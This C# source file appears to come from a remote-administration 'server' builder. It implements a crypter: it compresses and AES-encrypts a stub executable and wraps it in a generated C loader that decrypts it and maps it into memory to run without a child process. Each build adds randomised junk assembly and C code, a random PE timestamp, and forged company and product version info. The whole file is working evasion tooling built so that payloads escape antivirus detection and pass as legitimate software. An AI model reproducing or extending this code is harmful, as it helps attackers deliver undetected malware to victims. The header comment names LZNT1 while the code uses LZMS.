using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace SeroServer.Builder;

/// <summary>
/// Custom packer: LZNT1-compress + AES-256-CBC-encrypt the stub, then wrap it in a
/// randomised C loader (junk dead-code, AES decrypt via BCrypt, LZNT1 decompress,
/// in-memory PE map + CreateThread at entry point — no child process spawned).
/// Each build produces a unique binary: different junk symbols, random AES key/IV,
/// random PE timestamp, polymorphic x64 ASM junk functions.
/// </summary>
public static class CustomPackerBuilder
{
    // ── LZMS compression (Cabinet API — best ratio of all native Windows algorithms) ──

    [DllImport("cabinet.dll", SetLastError = true)]
    private static extern bool CreateCompressor(uint Algorithm, nint AllocationRoutines, out nint CompressorHandle);

    [DllImport("cabinet.dll", SetLastError = true)]
    private static extern bool Compress(nint CompressorHandle,
        byte[] UncompressedData, nint UncompressedDataSize,
        byte[] CompressedBuffer, nint CompressedBufferSize,
        out nint CompressedDataSize);

    [DllImport("cabinet.dll")]
    private static extern bool CloseCompressor(nint CompressorHandle);

    private const uint COMPRESS_ALGORITHM_LZMS = 5;

    private static byte[] Compress(byte[] data, Action<string> log)
    {
        if (!CreateCompressor(COMPRESS_ALGORITHM_LZMS, 0, out nint hComp))
            throw new InvalidOperationException($"CreateCompressor(LZMS) failed: {Marshal.GetLastWin32Error()}");
        var dst = new byte[data.Length * 2 + 65536];
        try
        {
            if (!Compress(hComp, data, (nint)data.Length, dst, (nint)dst.Length, out nint finalSize))
                throw new InvalidOperationException($"Compress(LZMS) failed: {Marshal.GetLastWin32Error()}");
            var result = new byte[(int)finalSize];
            Array.Copy(dst, result, (int)finalSize);
            log($"[*] CustomPacker: LZMS {data.Length / 1024:N0} KB → {result.Length / 1024:N0} KB ({100.0 * result.Length / data.Length:F0}%)");
            return result;
        }
        finally { CloseCompressor(hComp); }
    }

    // ── AES-256-CBC encryption ────────────────────────────────────────────────────

    private static (byte[] cipher, byte[] key, byte[] iv) EncryptAes(byte[] data)
    {
        var key = RandomNumberGenerator.GetBytes(32);
        var iv  = RandomNumberGenerator.GetBytes(16);
        using var aes = Aes.Create();
        aes.Key = key; aes.IV = iv;
        aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7;
        using var ms  = new MemoryStream();
        using var enc = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write);
        enc.Write(data); enc.FlushFinalBlock();
        return (ms.ToArray(), key, iv);
    }

    // ── Utilities ─────────────────────────────────────────────────────────────────

    private static string ToCArray(byte[] data, string name)
    {
        var sb = new StringBuilder();
        sb.Append($"static const unsigned char {name}[] = {{");
        for (int i = 0; i < data.Length; i++)
        {
            if (i % 16 == 0) sb.Append("\n    ");
            sb.Append($"0x{data[i]:X2}");
            if (i < data.Length - 1) sb.Append(',');
        }
        sb.Append($"\n}};\nstatic const unsigned int {name}_len = {data.Length}U;\n");
        return sb.ToString();
    }

    private static string Rnd(string prefix)
    {
        const string chars = "abcdefghijklmnopqrstuvwxyz";
        var buf = RandomNumberGenerator.GetBytes(6);
        return prefix + new string(buf.Select(b => chars[b % chars.Length]).ToArray());
    }

    private static ulong Rnd64() =>
        BitConverter.ToUInt64(RandomNumberGenerator.GetBytes(8));

    private static byte RndRot() =>
        (byte)(RandomNumberGenerator.GetBytes(1)[0] % 61 + 1);  // 1..61

    // ── MASM64 polymorphic ASM junk ───────────────────────────────────────────────

    private static (string asmSource, string fn1, string fn2, string fn3)
        GenerateAsmJunk()
    {
        string fn1 = Rnd("_za");
        string fn2 = Rnd("_zb");
        string fn3 = Rnd("_zc");

        ulong i1a = Rnd64(), i1b = Rnd64(), i1c = Rnd64();
        ulong i2a = Rnd64(), i2b = Rnd64();
        ulong i3a = Rnd64(), i3b = Rnd64(), i3c = Rnd64();
        byte r1 = RndRot(), r2 = RndRot(), r3 = RndRot(), r4 = RndRot();

        var src = $$"""
; Polymorphic x64 ASM dead-code — unique per build
PUBLIC {{fn1}}
PUBLIC {{fn2}}
PUBLIC {{fn3}}

.code

; Function 1: integer register arithmetic junk
{{fn1}} PROC
    push rbx
    push rdi
    push rsi
    sub  rsp, 28h
    xor  rax, rax
    mov  rbx, 0{{i1a:X16}}h
    mov  rdi, 0{{i1b:X16}}h
    xor  rbx, rdi
    ror  rbx, {{r1}}
    imul rbx, rbx, 5
    mov  rsi, 0{{i1c:X16}}h
    rol  rsi, {{r2}}
    add  rdi, rsi
    xor  rbx, rdi
    mov  rax, rbx
    add  rsp, 28h
    pop  rsi
    pop  rdi
    pop  rbx
    ret
{{fn1}} ENDP

; Function 2: stack-memory junk
{{fn2}} PROC
    push rbp
    push r12
    push r13
    sub  rsp, 40h
    mov  r12, 0{{i2a:X16}}h
    mov  r13, 0{{i2b:X16}}h
    xor  r12, r13
    ror  r12, {{r3}}
    mov  rbp, rsp
    add  rbp, 60h
    mov  QWORD PTR [rbp - 8],  r12
    mov  QWORD PTR [rbp - 16], r13
    mov  rax, QWORD PTR [rbp - 8]
    add  rax, QWORD PTR [rbp - 16]
    imul rax, rax, 3
    xor  r12, rax
    mov  rax, r12
    add  rsp, 40h
    pop  r13
    pop  r12
    pop  rbp
    ret
{{fn2}} ENDP

; Function 3: bit-manipulation chain junk
{{fn3}} PROC
    push rbx
    push rcx
    push rdx
    sub  rsp, 28h
    mov  rbx, 0{{i3a:X16}}h
    mov  rcx, 0{{i3b:X16}}h
    mov  rdx, 0{{i3c:X16}}h
    xor  rbx, rcx
    rol  rbx, {{r4}}
    imul rcx, rdx, 7
    xor  rdx, rbx
    add  rcx, rdx
    ror  rcx, {{r1}}
    xor  rbx, rcx
    not  rbx
    mov  rax, rbx
    add  rsp, 28h
    pop  rdx
    pop  rcx
    pop  rbx
    ret
{{fn3}} ENDP

END

""";
        return (src, fn1, fn2, fn3);
    }

    // ── Resource file (icon + version info) ──────────────────────────────────────

    private static string GenerateResourceSource(string? iconPath, LoaderMetadata? meta, string exeName)
    {
        var sb = new StringBuilder();
        sb.AppendLine("#include <windows.h>");
        if (!string.IsNullOrEmpty(iconPath))
            sb.AppendLine($"1 ICON \"{iconPath!.Replace("\\", "\\\\")}\"");
        if (meta != null)
        {
            var fv = ParseVersion(meta.FileVersion ?? "1.0.0.0");
            var pv = ParseVersion(meta.ProductVersion ?? meta.FileVersion ?? "1.0.0.0");
            sb.AppendLine($$"""
VS_VERSION_INFO VERSIONINFO
FILEVERSION {{fv}}
PRODUCTVERSION {{pv}}
FILEFLAGSMASK VS_FFI_FILEFLAGSMASK
FILEFLAGS 0x0L
FILEOS VOS__WINDOWS32
FILETYPE VFT_APP
FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName",      "{{EscRc(meta.CompanyName)}}"
            VALUE "FileDescription",  "{{EscRc(meta.FileDescription)}}"
            VALUE "FileVersion",      "{{EscRc(meta.FileVersion)}}"
            VALUE "InternalName",     "{{EscRc(Path.GetFileNameWithoutExtension(exeName))}}"
            VALUE "LegalCopyright",   "{{EscRc(meta.Copyright)}}"
            VALUE "OriginalFilename", "{{EscRc(exeName)}}"
            VALUE "ProductName",      "{{EscRc(meta.ProductName)}}"
            VALUE "ProductVersion",   "{{EscRc(meta.ProductVersion)}}"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x0409, 0x04B0
    END
END
""");
        }
        return sb.ToString();
    }

    private static string ParseVersion(string? v)
    {
        var parts = (v ?? "1.0.0.0").Split('.').Take(4).Select(p =>
            int.TryParse(p, out int n) ? n : 0).ToArray();
        while (parts.Length < 4) parts = [.. parts, 0];
        return $"{parts[0]},{parts[1]},{parts[2]},{parts[3]}";
    }

    private static string EscRc(string? s) =>
        (s ?? "").Replace("\\", "\\\\").Replace("\"", "\\\"");

    // ── C loader source ───────────────────────────────────────────────────────────

    private static string GenerateLoaderSource(
        byte[] cipher, byte[] key, byte[] iv,
        uint compressedLen, uint originalLen,
        string fnAsm1, string fnAsm2, string fnAsm3)
    {
        string fnAes  = Rnd("_a");
        string fnDcmp = Rnd("_b");
        string fnRun  = Rnd("_c");
        string fnJunk = Rnd("_j");
        string varX   = Rnd("x_");
        string varY   = Rnd("y_");
        uint jk1 = BitConverter.ToUInt32(RandomNumberGenerator.GetBytes(4));
        uint jk2 = BitConverter.ToUInt32(RandomNumberGenerator.GetBytes(4));
        uint jk3 = BitConverter.ToUInt32(RandomNumberGenerator.GetBytes(4));

        return $$"""
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <bcrypt.h>
#include <compressapi.h>
#include <stdint.h>
#include <string.h>
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "cabinet.lib")

{{ToCArray(cipher, "g_enc")}}
{{ToCArray(key,    "g_key")}}
{{ToCArray(iv,     "g_iv")}}
static const unsigned int g_cmp_size = {{compressedLen}}U;
static const unsigned int g_org_size = {{originalLen}}U;

/* ── ASM junk (extern — defined in junk.asm, different every build) ── */
extern unsigned long long {{fnAsm1}}(void);
extern unsigned long long {{fnAsm2}}(void);
extern unsigned long long {{fnAsm3}}(void);

/* ── C junk dead-code — optimizer disabled ── */
#pragma optimize("", off)
static __declspec(noinline) unsigned int {{fnJunk}}(unsigned int {{varX}}) {
    volatile unsigned int {{varY}} = {{varX}} ^ 0x{{jk1:X8}}U;
    for (int i = 0; i < 4; i++) {{varY}} = ({{varY}} >> 1) | ({{varY}} << 31);
    if ({{varY}} > 0x{{jk2:X8}}U) { {{varY}} ^= 0x{{jk3:X8}}U; {{varY}} += {{varX}}; }
    return {{varY}} ^ 0x{{jk2:X8}}U;
}
#pragma optimize("", on)

/* ── AES-256-CBC decrypt via BCrypt ── */
static unsigned char* {{fnAes}}(const unsigned char* src, unsigned int src_len, unsigned int* out_len) {
    BCRYPT_ALG_HANDLE hAlg = NULL; BCRYPT_KEY_HANDLE hKey = NULL;
    unsigned char keyObj[1024] = {0}; unsigned char* out = NULL;
    ULONG cbKeyObj = 0, cbData = 0;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) goto done;
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObj, sizeof(ULONG), &cbData, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, (cbKeyObj <= sizeof(keyObj)) ? keyObj : NULL, cbKeyObj, (PUCHAR)g_key, g_key_len, 0))) goto done;
    unsigned char iv_copy[16]; memcpy(iv_copy, g_iv, 16);
    ULONG plainLen = 0;
    BCryptDecrypt(hKey, (PUCHAR)src, src_len, NULL, iv_copy, 16, NULL, 0, &plainLen, BCRYPT_BLOCK_PADDING);
    out = (unsigned char*)VirtualAlloc(NULL, plainLen, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!out) goto done;
    memcpy(iv_copy, g_iv, 16);
    if (!BCRYPT_SUCCESS(BCryptDecrypt(hKey, (PUCHAR)src, src_len, NULL, iv_copy, 16, out, plainLen, &cbData, BCRYPT_BLOCK_PADDING))) {
        VirtualFree(out, 0, MEM_RELEASE); out = NULL;
    } else { *out_len = cbData; }
done:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return out;
}

/* ── LZMS decompress (Cabinet API — best native Windows ratio) ── */
static unsigned char* {{fnDcmp}}(const unsigned char* src, SIZE_T src_len, SIZE_T out_len) {
    DECOMPRESSOR_HANDLE hDec = NULL;
    if (!CreateDecompressor(COMPRESS_ALGORITHM_LZMS, NULL, &hDec)) return NULL;
    unsigned char* out = (unsigned char*)VirtualAlloc(NULL, out_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!out) { CloseDecompressor(hDec); return NULL; }
    SIZE_T final = 0;
    BOOL ok = Decompress(hDec, (PVOID)src, src_len, out, out_len, &final);
    CloseDecompressor(hDec);
    if (!ok || final != out_len) { VirtualFree(out, 0, MEM_RELEASE); return NULL; }
    return out;
}

/* ── In-memory PE loader: map in current process + CreateThread at EP ── */
static int {{fnRun}}(unsigned char* pe, unsigned int pe_len) {
    (void)pe_len;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pe;
    if (dos->e_magic != 0x5A4D) return 0;
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(pe + dos->e_lfanew);
    if (nt->Signature != 0x00004550) return 0;

    ULONG_PTR preferred = nt->OptionalHeader.ImageBase;
    DWORD img_size = nt->OptionalHeader.SizeOfImage;

    LPVOID base = VirtualAlloc((LPVOID)preferred, img_size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base) base = VirtualAlloc(NULL, img_size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!base) return 0;

    ULONG_PTR delta = (ULONG_PTR)base - preferred;

    memcpy(base, pe, nt->OptionalHeader.SizeOfHeaders);
    IMAGE_SECTION_HEADER* sec = (IMAGE_SECTION_HEADER*)((UCHAR*)nt + sizeof(IMAGE_NT_HEADERS64));
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++)
        if (sec[i].SizeOfRawData)
            memcpy((UCHAR*)base + sec[i].VirtualAddress, pe + sec[i].PointerToRawData, sec[i].SizeOfRawData);

    if (delta && nt->OptionalHeader.DataDirectory[5].Size) {
        IMAGE_BASE_RELOCATION* rel = (IMAGE_BASE_RELOCATION*)((UCHAR*)base + nt->OptionalHeader.DataDirectory[5].VirtualAddress);
        while (rel->VirtualAddress) {
            WORD* e = (WORD*)((UCHAR*)rel + sizeof(IMAGE_BASE_RELOCATION));
            DWORD n = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            for (DWORD j = 0; j < n; j++) {
                int type = e[j] >> 12; DWORD off = e[j] & 0xFFF;
                if (type == 10)      { ULONG_PTR* p = (ULONG_PTR*)((UCHAR*)base + rel->VirtualAddress + off); *p += delta; }
                else if (type == 3)  { DWORD*     p = (DWORD*)    ((UCHAR*)base + rel->VirtualAddress + off); *p += (DWORD)delta; }
            }
            rel = (IMAGE_BASE_RELOCATION*)((UCHAR*)rel + rel->SizeOfBlock);
        }
    }

    if (nt->OptionalHeader.DataDirectory[1].Size) {
        IMAGE_IMPORT_DESCRIPTOR* imp = (IMAGE_IMPORT_DESCRIPTOR*)((UCHAR*)base + nt->OptionalHeader.DataDirectory[1].VirtualAddress);
        for (; imp->Name; imp++) {
            HMODULE hMod = LoadLibraryA((LPCSTR)((UCHAR*)base + imp->Name));
            if (!hMod) continue;
            ULONG_PTR* thunk  = (ULONG_PTR*)((UCHAR*)base + (imp->FirstThunk ? imp->FirstThunk : imp->OriginalFirstThunk));
            ULONG_PTR* oThunk = imp->OriginalFirstThunk ? (ULONG_PTR*)((UCHAR*)base + imp->OriginalFirstThunk) : thunk;
            for (; *oThunk; thunk++, oThunk++) {
                FARPROC fn;
                if (*oThunk & IMAGE_ORDINAL_FLAG64) fn = GetProcAddress(hMod, (LPCSTR)IMAGE_ORDINAL64(*oThunk));
                else fn = GetProcAddress(hMod, ((IMAGE_IMPORT_BY_NAME*)((UCHAR*)base + *oThunk))->Name);
                if (fn) *thunk = (ULONG_PTR)fn;
            }
        }
    }

    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD ch = sec[i].Characteristics, prot = PAGE_READONLY, old = 0;
        if ((ch & IMAGE_SCN_MEM_EXECUTE) && (ch & IMAGE_SCN_MEM_WRITE)) prot = PAGE_EXECUTE_READWRITE;
        else if (ch & IMAGE_SCN_MEM_EXECUTE) prot = PAGE_EXECUTE_READ;
        else if (ch & IMAGE_SCN_MEM_WRITE)   prot = PAGE_READWRITE;
        DWORD sz = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
        VirtualProtect((UCHAR*)base + sec[i].VirtualAddress, sz, prot, &old);
    }

    ULONG_PTR ep = (ULONG_PTR)base + nt->OptionalHeader.AddressOfEntryPoint;
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ep, NULL, 0, NULL);
    if (hThread) { WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); }
    return 1;
}

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
    (void)h; (void)p; (void)cmd; (void)show;

    /* Touch all junk — forces linker to include them */
    volatile unsigned int  _dc = {{fnJunk}}(GetCurrentProcessId());  (void)_dc;
    volatile unsigned long long _d1 = {{fnAsm1}}(); (void)_d1;
    volatile unsigned long long _d2 = {{fnAsm2}}(); (void)_d2;
    volatile unsigned long long _d3 = {{fnAsm3}}(); (void)_d3;

    unsigned int plainLen = 0;
    unsigned char* compressed = {{fnAes}}(g_enc, g_enc_len, &plainLen);
    if (!compressed) return 1;

    unsigned char* pe = {{fnDcmp}}(compressed, (SIZE_T)g_cmp_size, (SIZE_T)g_org_size);
    VirtualFree(compressed, 0, MEM_RELEASE);
    if (!pe) return 1;

    {{fnRun}}(pe, g_org_size);

    VirtualFree(pe, 0, MEM_RELEASE);
    return 0;
}
""";
    }

    // ── Randomise PE timestamp ────────────────────────────────────────────────────

    private static void RandomisePeTimestamp(string exePath)
    {
        try
        {
            var bytes = File.ReadAllBytes(exePath);
            if (bytes.Length < 0x40) return;
            int peOff = BitConverter.ToInt32(bytes, 0x3C);
            if (peOff + 8 > bytes.Length || bytes[peOff] != 'P' || bytes[peOff + 1] != 'E') return;
            BitConverter.GetBytes((uint)Random.Shared.Next()).CopyTo(bytes, peOff + 8);
            File.WriteAllBytes(exePath, bytes);
        }
        catch { }
    }

    // ── Tool helpers ─────────────────────────────────────────────────────────────

    private static string? FindRcExe(Dictionary<string, string> vsEnv)
    {
        if (vsEnv.TryGetValue("WindowsSdkBinPath", out var binPath) &&
            vsEnv.TryGetValue("WindowsSDKVersion", out var sdkVer))
        {
            // vcvarsall sets WindowsSDKVersion with a trailing backslash
            sdkVer = sdkVer.TrimEnd('\\', '/');
            var rc = Path.Combine(binPath, sdkVer, "x64", "rc.exe");
            if (File.Exists(rc)) return rc;
        }
        var kits = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
            "Windows Kits", "10", "bin");
        if (Directory.Exists(kits))
            foreach (var ver in Directory.GetDirectories(kits).OrderByDescending(x => x))
            {
                var rc = Path.Combine(ver, "x64", "rc.exe");
                if (File.Exists(rc)) return rc;
            }
        return null;
    }

    private static async Task<bool> RunAsync(
        string exe, string args,
        Dictionary<string, string>? env,
        Action<string> log,
        string label)
    {
        var psi = new System.Diagnostics.ProcessStartInfo
        {
            FileName               = exe,
            Arguments              = args,
            RedirectStandardOutput = true,
            RedirectStandardError  = true,
            UseShellExecute        = false,
            CreateNoWindow         = true,
        };
        if (env != null) foreach (var kv in env) psi.Environment[kv.Key] = kv.Value;
        using var proc = System.Diagnostics.Process.Start(psi)!;
        var stdout = await proc.StandardOutput.ReadToEndAsync();
        var stderr = await proc.StandardError.ReadToEndAsync();
        await proc.WaitForExitAsync();
        if (proc.ExitCode != 0)
        {
            log($"[!] CustomPacker: {label} failed (exit {proc.ExitCode})");
            if (!string.IsNullOrWhiteSpace(stdout)) log(stdout.TrimEnd());
            if (!string.IsNullOrWhiteSpace(stderr)) log(stderr.TrimEnd());
            return false;
        }
        return true;
    }

    // ── Public entry point ────────────────────────────────────────────────────────

    public static async Task ApplyAsync(
        string exePath,
        Action<string> log,
        string?        iconPath = null,
        LoaderMetadata? meta    = null)
    {
        log("[*] CustomPacker: Starting...");
        byte[] raw = await File.ReadAllBytesAsync(exePath);
        log($"[*] CustomPacker: Input {raw.Length / 1024:N0} KB");

        byte[] compressed = Compress(raw, log);
        var (cipher, key, iv) = EncryptAes(compressed);
        log($"[*] CustomPacker: AES-256-CBC encrypted ({cipher.Length / 1024:N0} KB)");

        var (asmSrc, fn1, fn2, fn3) = GenerateAsmJunk();
        string loaderSrc = GenerateLoaderSource(cipher, key, iv,
            (uint)compressed.Length, (uint)raw.Length, fn1, fn2, fn3);

        string? clPath = FindClExe(log);
        if (clPath == null) { log("[!] CustomPacker: cl.exe not found — skipped."); return; }

        var ml64Path = Path.Combine(Path.GetDirectoryName(clPath)!, "ml64.exe");
        if (!File.Exists(ml64Path))
        {
            log("[!] CustomPacker: ml64.exe not found alongside cl.exe — skipped.");
            return;
        }

        var vsEnv  = GetVsEnvironment(clPath);
        var tempDir = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
        Directory.CreateDirectory(tempDir);
        try
        {
            // 1. Compile ASM junk → junk.obj
            var asmPath = Path.Combine(tempDir, "junk.asm");
            var objPath = Path.Combine(tempDir, "junk.obj");
            await File.WriteAllTextAsync(asmPath, asmSrc);
            var ok = await RunAsync(ml64Path,
                $"/nologo /c /Fo\"{objPath}\" \"{asmPath}\"",
                vsEnv, log, "ml64");
            if (!ok || !File.Exists(objPath)) return;
            log("[+] CustomPacker: x64 ASM junk compiled.");

            // 2. Compile RC resource (icon + version) if applicable
            string resArg = "";
            bool   hasResources = !string.IsNullOrEmpty(iconPath) || meta != null;
            if (hasResources)
            {
                var rcExe = vsEnv != null ? FindRcExe(vsEnv) : null;
                if (rcExe != null)
                {
                    var rcSrc  = Path.Combine(tempDir, "loader.rc");
                    var resOut = Path.Combine(tempDir, "loader.res");
                    await File.WriteAllTextAsync(rcSrc,
                        GenerateResourceSource(iconPath, meta, Path.GetFileName(exePath)));
                    ok = await RunAsync(rcExe,
                        $"/nologo /fo \"{resOut}\" \"{rcSrc}\"",
                        vsEnv, log, "rc");
                    if (ok && File.Exists(resOut))
                    {
                        resArg = $" \"{resOut}\"";
                        log("[+] CustomPacker: resource (icon/version) compiled.");
                    }
                    else
                        log("[~] CustomPacker: rc.exe failed — continuing without resources.");
                }
                else
                    log("[~] CustomPacker: rc.exe not found — continuing without resources.");
            }

            // 3. Compile C loader + link junk.obj [+ loader.res]
            var srcPath = Path.Combine(tempDir, "loader.c");
            var outPath = Path.Combine(tempDir, "loader.exe");
            await File.WriteAllTextAsync(srcPath, loaderSrc);

            ok = await RunAsync(clPath,
                $"\"{srcPath}\" \"{objPath}\"{resArg} /O2 /GS- /MT /W0 /nologo " +
                $"/Fe\"{outPath}\" kernel32.lib bcrypt.lib cabinet.lib " +
                "/link /SUBSYSTEM:WINDOWS /INCREMENTAL:NO /OPT:REF /OPT:ICF",
                vsEnv, log, "cl");
            if (!ok || !File.Exists(outPath)) return;

            RandomisePeTimestamp(outPath);

            var packedSize = new FileInfo(outPath).Length;
            var ratio = 100.0 * packedSize / raw.Length;
            log($"[+] CustomPacker: {raw.Length / 1024:N0} KB → {packedSize / 1024:N0} KB ({ratio:F0}% of original)");
            File.Copy(outPath, exePath, overwrite: true);
            log($"[+] CustomPacker: Applied to {Path.GetFileName(exePath)}");
        }
        finally { try { Directory.Delete(tempDir, true); } catch { } }
    }

    // ── cl.exe / VS environment helpers ──────────────────────────────────────────

    private static string? FindClExe(Action<string>? log = null)
    {
        var vswhere = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
            "Microsoft Visual Studio", "Installer", "vswhere.exe");

        if (File.Exists(vswhere))
        {
            foreach (var args in new[]
            {
                @"-latest -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -find VC\Tools\MSVC\**\bin\Hostx64\x64\cl.exe",
                @"-latest -prerelease -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -find VC\Tools\MSVC\**\bin\Hostx64\x64\cl.exe",
                @"-all -find VC\Tools\MSVC\**\bin\Hostx64\x64\cl.exe",
            })
            {
                try
                {
                    var psi = new System.Diagnostics.ProcessStartInfo(vswhere, args)
                        { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
                    using var p = System.Diagnostics.Process.Start(psi)!;
                    string? line;
                    while ((line = p.StandardOutput.ReadLine()?.Trim()) != null)
                    {
                        p.WaitForExit(5000);
                        if (!string.IsNullOrEmpty(line) && File.Exists(line)) return line;
                    }
                }
                catch { }
            }
        }

        foreach (var pf in new[]
        {
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
            Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
        })
        {
            var vsBase = Path.Combine(pf, "Microsoft Visual Studio");
            if (!Directory.Exists(vsBase)) continue;
            foreach (var verDir in Directory.GetDirectories(vsBase).OrderByDescending(x => x))
                foreach (var ed in Directory.GetDirectories(verDir).OrderByDescending(x => x))
                {
                    var msvc = Path.Combine(ed, "VC", "Tools", "MSVC");
                    if (!Directory.Exists(msvc)) continue;
                    foreach (var v in Directory.GetDirectories(msvc).OrderByDescending(x => x))
                    {
                        var cl = Path.Combine(v, "bin", "Hostx64", "x64", "cl.exe");
                        if (File.Exists(cl)) return cl;
                    }
                }
        }

        log?.Invoke("[!] cl.exe not found. Install VS 2022/2025 with C++ Desktop workload.");
        return null;
    }

    private static Dictionary<string, string>? GetVsEnvironment(string clExePath)
    {
        try
        {
            var dir = Path.GetDirectoryName(clExePath)!;
            for (int i = 0; i < 6; i++)
            {
                dir = Path.GetDirectoryName(dir) ?? "";
                var vcvars = Path.Combine(dir, "Auxiliary", "Build", "vcvarsall.bat");
                if (!File.Exists(vcvars)) continue;
                var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe",
                    $"/c \"\"{vcvars}\" amd64 && set\"")
                {
                    RedirectStandardOutput = true,
                    UseShellExecute  = false,
                    CreateNoWindow   = true,
                };
                using var p = System.Diagnostics.Process.Start(psi)!;
                var env = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
                string? line;
                while ((line = p.StandardOutput.ReadLine()) != null)
                {
                    int eq = line.IndexOf('=');
                    if (eq > 0) env[line[..eq]] = line[(eq + 1)..];
                }
                p.WaitForExit(15000);
                if (env.Count > 0) return env;
            }
        }
        catch { }
        return null;
    }
}
